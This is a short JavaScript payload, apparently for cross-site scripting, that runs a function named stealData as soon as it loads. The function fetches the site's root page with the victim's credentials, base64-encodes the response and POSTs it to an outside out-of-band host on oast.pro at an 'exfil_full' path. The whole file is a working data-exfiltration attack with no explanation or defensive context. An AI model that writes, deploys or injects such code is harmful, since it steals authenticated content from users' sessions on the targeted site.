function read_body(xhr) {
    if (!xhr.responseType || xhr.responseType === "text") return xhr.responseText;
    if (xhr.responseType === "document") return xhr.responseXML;
    if (xhr.responseType === "json") return xhr.responseJSON;
    return xhr.response;
}
function stealData() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "/", true);
    xhr.withCredentials = true;
    xhr.send(null);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            var exfilData = btoa(unescape(encodeURIComponent(read_body(xhr))));
            fetch("https://d6q3p0qn5cd2d3h6lbp07sicoi8wfzw8e.oast.pro/exfil_full", {
                method: "POST",
                mode: "no-cors",
                credentials: "omit",
                headers: { "Content-Type": "text/plain" },
                body: exfilData
            });
        }
    };
}
stealData();
